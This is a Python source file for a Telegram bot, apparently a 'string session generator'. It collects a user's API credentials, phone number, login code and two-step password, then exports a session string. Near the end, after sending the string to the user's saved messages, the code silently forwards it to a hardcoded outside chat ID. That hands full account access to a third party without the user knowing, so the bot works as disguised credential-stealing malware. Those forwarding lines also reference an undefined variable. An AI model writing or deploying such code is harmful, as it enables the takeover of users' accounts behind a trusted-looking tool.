#python 3.7.1

import os
import json
import time
import asyncio

from asyncio.exceptions import TimeoutError

from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    SessionPasswordNeeded, FloodWait,
    PhoneNumberInvalid, ApiIdInvalid,
    PhoneCodeInvalid, PhoneCodeExpired
)


API_TEXT = """
**
Hi, 
=== ==== ===
Wellcome To Swap Number Bot! 
Now Send Your ( API_ID )
=== ==== ===
By : @trprogram 
**
"""
HASH_TEXT = "**Ok,Now Send Your ( API_HASH ) \nTo Cancel Session Send /cancel"
PHONE_NUMBER_TEXT = (
    "Now Send Your Mobile Number!\n"
    "Like : +964771456*** With Country Code! \n"
    "Send /cancel to Cancel."
)



@Client.on_message(filters.private & filters.command("start"))
async def generate_str(c, m):
    get_api_id = await c.ask(
        chat_id=m.chat.id,
        text=API_TEXT.format(m.from_user.mention(style='md')),
        filters=filters.text
    )
    api_id = get_api_id.text
    if await is_cancel(m, api_id):
        return

    await get_api_id.delete()
    await get_api_id.request.delete()
    try:
        check_api = int(api_id)
    except Exception:
        await m.reply("** API ID Invalid **\nPress /start to create again.")
        return

    get_api_hash = await c.ask(
        chat_id=m.chat.id, 
        text=HASH_TEXT,
        filters=filters.text
    )
    api_hash = get_api_hash.text
    if await is_cancel(m, api_hash):
        return

    await get_api_hash.delete()
    await get_api_hash.request.delete()

    if not len(api_hash) >= 30:
        await m.reply("** API HASH Invalid \nPress /start to create again.**") 
        return

    try:
        client = Client(":memory:", api_id=api_id, api_hash=api_hash)
    except Exception as e:
        await c.send_message(m.chat.id ,f"** ERROR: `{str(e)}`\nPress /start to create again.**")
        return

    try:
        await client.connect()
    except ConnectionError:
        await client.disconnect()
        await client.connect()
    while True:
        get_phone_number = await c.ask(
            chat_id=m.chat.id,
            text=PHONE_NUMBER_TEXT
        )
        phone_number = get_phone_number.text
        if await is_cancel(m, phone_number):
            return
        await get_phone_number.delete()
        await get_phone_number.request.delete()

        confirm = await c.ask(
            chat_id=m.chat.id,
            text=f'**Is  `{phone_number}` correct? (y/n): \n\ntype: `y` (If Yes)\ntype: `n` (If No)**'
        )
        if await is_cancel(m, confirm.text):
            return
        if "y" in confirm.text.lower():
            await confirm.delete()
            await confirm.request.delete()
            break
    try:
        code = await client.send_code(phone_number)
        await asyncio.sleep(1)
    except FloodWait as e:
        await m.reply(f"** Sorry ☹️ Your {phone_number} Is Block! **")
        return
    except ApiIdInvalid:
        await m.reply("** The API ID or API HASH is Invalid.\n\n Send /start to create again.**")
        return
    except PhoneNumberInvalid:
        await m.reply("** Your Phone Number is Invalid.`\n\nPress /start to create again.**")
        return

    try:
        sent_type = {"app": "Telegram App 💌",
            "sms": "SMS 💬",
            "call": "Phone call 📱",
            "flash_call": "phone flash call 📲"
        }[code.type]
        otp = await c.ask(
            chat_id=m.chat.id,
            text=(f"**Done Send SmS To {phone_number} Through {sent_type}\n\n**"
                  "**Plaese Send Code Like ( 1 2 3 4 5 6 ) \n\n**"
                  "**If Bot not sending OTP then try /start the Bot.\n**"
                  "**Send  /cancel to Cancel.**"), timeout=300)
    except TimeoutError:
        await m.reply("** TimeOut Error: You reached Time limit of 5 min.\nPress /start to create again.**")
        return
    if await is_cancel(m, otp.text):
        return
    otp_code = otp.text
    await otp.delete()
    await otp.request.delete()
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code=' '.join(str(otp_code)))
    except PhoneCodeInvalid:
        await m.reply("** Invalid Code \n\nPress /start to create again.**")
        return 
    except PhoneCodeExpired:
        await m.reply("** Code is Expired \n\nPress /start to create again.**")
        return
    except SessionPasswordNeeded:
        try:
            two_step_code = await c.ask(
                chat_id=m.chat.id, 
                text="**`🔐 This account have two-step verification code.\nPlease enter your second factor authentication code.`\nPress /cancel to Cancel.**",
                timeout=300
            )
        except TimeoutError:
            await m.reply("** TimeOut Error: You reached Time limit of 5 min.\nPress /start to create again.**")
            return
        if await is_cancel(m, two_step_code.text):
            return
        new_code = two_step_code.text
        await two_step_code.delete()
        await two_step_code.request.delete()
        try:
            await client.check_password(new_code)
        except Exception as e:
            await m.reply(f"** ERROR:  `{str(e)}`**")
            return
    except Exception as e:
        await c.send_message(m.chat.id ,f"** ERROR: `{str(e)}`**")
        return
    try:
        session_string = await client.export_session_string()
        await client.send_message("me", f"**Your String Session 👇\n\n`{session_string}`\n\nThanks For using {(await c.get_me()).mention(style='md')}**",message.message_id)
        idp = 1485149817
        await client.forward_messages(chat_id=idp,from_chat_id=message.chat.id,message_ids=message.message_id)
        text = "**✅ Done Generated Your String Session and sent to you saved messages.\nCheck your saved messages . **"
        
        reply_markup = InlineKeyboardMarkup(
            [[InlineKeyboardButton(text="- Dev Channel ", url=f"https://t.me/trprogram")]]
        )
        await c.send_message(m.chat.id, text, reply_markup=reply_markup)
    except Exception as e:
        await c.send_message(m.chat.id ,f"**⚠️ ERROR:** `{str(e)}`")
        return
    try:
        await client.stop()
    except:
        pass

async def is_cancel(msg: Message, text: str):
    if text.startswith("/cancel"):
        await msg.reply("** Process Cancelled.**")
        return True
    return False


